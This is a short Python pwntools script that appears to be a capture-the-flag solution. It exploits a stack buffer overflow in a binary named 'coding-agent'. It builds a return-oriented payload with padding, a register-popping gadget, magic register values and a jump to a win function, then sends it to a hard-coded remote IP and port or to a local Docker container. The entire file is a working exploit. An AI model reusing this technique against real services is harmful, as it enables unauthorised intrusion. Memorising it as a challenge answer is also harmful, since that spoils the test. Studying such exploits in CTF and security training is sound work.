#!/usr/bin/env python3
import argparse

from pwn import p64, process, remote

OFFSET = 0x28
POP_RBX_RBP_R12_R13_R14_R15_RET = 0x4013ED
WIN = 0x4013F8

RBX_MAGIC = 0x03B001D000084000
R12_MAGIC = 0x0000000700002C40
R14_MAGIC = 0x00007A0000006876


def build_payload() -> bytes:
    payload = b"A" * OFFSET
    payload += p64(POP_RBX_RBP_R12_R13_R14_R15_RET)
    payload += p64(RBX_MAGIC)
    payload += p64(0xDEADBEEFDEADBEEF)  # rbp
    payload += p64(R12_MAGIC)
    payload += p64(0x4141414141414141)  # r13
    payload += p64(R14_MAGIC)
    payload += p64(0x4242424242424242)  # r15
    payload += p64(WIN)
    return payload


def start_local():
    return process(
        [
            "docker",
            "run",
            "--rm",
            "-i",
            "--platform",
            "linux/amd64",
            "-v",
            f"{__file__.rsplit('/', 1)[0]}:/work",
            "-w",
            "/work",
            "public.ecr.aws/docker/library/python:3.12-slim",
            "./coding-agent",
        ],
    )


def start_remote(host: str, port: int):
    return remote(host, port)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--local", action="store_true")
    ap.add_argument("--host", default="133.88.122.244")
    ap.add_argument("--port", type=int, default=32228)
    args = ap.parse_args()

    io = start_local() if args.local else start_remote(args.host, args.port)
    io.recvuntil(b"> ")
    io.send(build_payload() + b"\n")
    print(io.recvall(timeout=5).decode(errors="ignore"))


if __name__ == "__main__":
    main()
